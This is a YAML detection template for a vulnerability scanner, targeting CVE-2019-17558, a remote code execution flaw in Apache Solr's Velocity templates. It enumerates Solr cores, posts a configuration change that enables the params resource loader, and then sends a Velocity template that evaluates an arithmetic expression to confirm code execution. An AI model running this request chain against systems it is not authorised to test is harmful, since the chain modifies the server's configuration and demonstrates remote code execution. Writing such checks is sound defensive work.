id: CVE-2019-17558

info:
  name: Apache Solr Velocity Template RCE
  author: Loneyer
  severity: high
  verified: false
  description: |
    Apache Solr before 8.4.0 allows remote attackers to execute arbitrary commands via Velocity templates.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-17558
  tags: cve,cve2019,solr,rce
  created: 2023/08/10

set:
  r1: randomInt(20000, 40000)
  r2: randomInt(20000, 40000)
rules:
  r0:
    request:
      method: GET
      path: /solr/admin/cores?wt=json
      follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b"responseHeader")
    output:
      search: '"\"name\":\"(?P<core>[^\"]+)\"".bsubmatch(response.body)'
      core: search["core"]
  r1:
    request:
      method: POST
      path: /solr/{{core}}/config
      headers:
        Content-Type: application/json
      body: |-
        {
          "update-queryresponsewriter": {
            "startup": "test",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }
    expression: response.status == 200
  r2:
    request:
      method: GET
      path: /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c
    expression: response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1() && r2()
